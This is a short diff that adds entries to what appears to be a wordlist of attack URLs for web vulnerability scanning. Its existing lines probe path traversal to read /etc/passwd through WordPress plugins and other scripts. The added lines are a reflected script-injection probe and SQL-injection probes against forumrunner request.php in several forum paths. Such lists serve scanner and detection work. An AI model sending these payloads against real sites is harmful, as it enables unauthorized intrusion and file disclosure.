@@ -205,3 +205,10 @@
 /wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd
 /?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 /wt3/forceSave.php?file=/etc/passwd
+/index.php?currentpath=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/boards/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/board/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/forum/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/forums/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/vb/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
